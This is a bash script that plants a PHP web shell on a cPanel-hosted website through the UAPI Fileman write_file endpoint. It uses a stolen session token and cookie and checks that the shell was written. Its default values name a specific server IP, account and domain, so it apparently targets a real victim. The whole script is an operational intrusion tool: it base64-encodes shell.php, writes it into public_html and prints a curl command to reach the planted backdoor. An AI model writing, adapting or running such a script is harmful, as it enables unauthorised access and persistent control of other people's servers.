#!/bin/bash
# Upload shell using UAPI execute endpoint (more modern)
# Usage: ./upload_uapi_execute.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE> <TARGET_USER> <TARGET_DOMAIN>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
TARGET_USER="${4:-wagamacy}"
TARGET_DOMAIN="${5:-wagamama.com.cy}"

echo "========================================"
echo "  Upload via UAPI Execute"
echo "========================================"
echo ""
echo "Target: $TARGET_DOMAIN ($TARGET_USER)"
echo ""

# Check shell file
SHELL_FILE="/root/cPanelSniper/shell.php"
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

# Convert to base64
SHELL_B64=$(base64 -w 0 "$SHELL_FILE")
echo "✓ Shell loaded: $(echo "$SHELL_B64" | wc -c) bytes (base64)"
echo ""

echo "[1/3] Testing UAPI Fileman::list_files..."

# Try UAPI list files first
UAPI_LIST=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/execute/Fileman/list_files" \
  -H "Authorization: cpanel ${TARGET_USER}:${COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"path": "/public_html"}' 2>/dev/null)

if [ $? -eq 0 ] && [ -n "$UAPI_LIST" ]; then
    echo "✅ UAPI Fileman::list_files accessible"
    echo "$UAPI_LIST" | python3 -m json.tool 2>/dev/null | head -20
else
    echo "❌ UAPI not accessible via this method"
fi

echo ""
echo "[2/3] Trying Fileman::write_file..."

# Try to write file using write_file
UAPI_WRITE=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/execute/Fileman/write_file" \
  -H "Authorization: cpanel ${TARGET_USER}:${COOKIE}" \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"/home/${TARGET_USER}/public_html/shell.php\", \"content\": \"${SHELL_B64}\", \"encoding\": \"base64\"}" 2>/dev/null)

echo "Response:"
echo "$UAPI_WRITE" | python3 -m json.tool 2>/dev/null || echo "$UAPI_WRITE"

echo ""
echo "[3/3] Checking if file was created..."

# List files to check
UAPI_CHECK=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/execute/Fileman/list_files" \
  -H "Authorization: cpanel ${TARGET_USER}:${COOKIE}" \
  -H "Content-Type: application/json" \
  -d '{"path": "/public_html"}' 2>/dev/null)

if echo "$UAPI_CHECK" | grep -q "shell.php"; then
    echo "✅ shell.php found!"
else
    echo "❌ shell.php NOT found"
    echo ""
    echo "Files in public_html:"
    echo "$UAPI_CHECK" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    if 'data' in data:
        for f in data['data']:
            print(f'  • {f.get(\"name\", \"?\")} - {f.get(\"size\", \"?\")} bytes')
except:
    print('  Could not parse file list')
" 2>/dev/null || echo "$UAPI_CHECK"
fi

echo ""
echo "========================================"
echo "  Result"
echo "========================================"
echo ""
echo "Test URL:"
echo "  curl -sk https://${TARGET_DOMAIN}/shell.php | head -20"
echo ""
